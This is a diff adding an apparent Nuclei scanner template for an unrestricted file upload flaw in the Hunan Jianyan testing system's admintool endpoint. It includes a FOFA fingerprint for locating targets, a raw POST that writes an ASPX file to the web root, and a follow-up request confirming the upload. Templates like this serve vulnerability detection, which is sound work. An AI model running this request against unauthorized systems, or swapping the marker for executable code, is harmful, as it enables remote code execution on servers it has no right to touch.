@@ -1,0 +1,38 @@
+id: hunan-jianyan-test-admintool-file-upload
+
+info:
+  name: "湖南建研检测系统 admintool 接口文件上传未限制类型及路径漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/Content/Theme/Standard/webSite/login.css"
+      湖南建研检测系统admintool接口存在文件上传功能未正确限制文件类型及存储路径的问题，攻击者可通过构造特定请求上传任意后缀文件至服务器可控路径，导致远程代码执行或系统文件篡改风险。
+  tags: 湖南建研检测系统
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /Scripts/admintool?type=updatefile HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+    Accept-Encoding: gzip, deflate, br
+
+    filePath=NTest.aspx&fileContent=NdayTest
+- raw:
+  - |
+    GET /Scripts/NTest.aspx HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
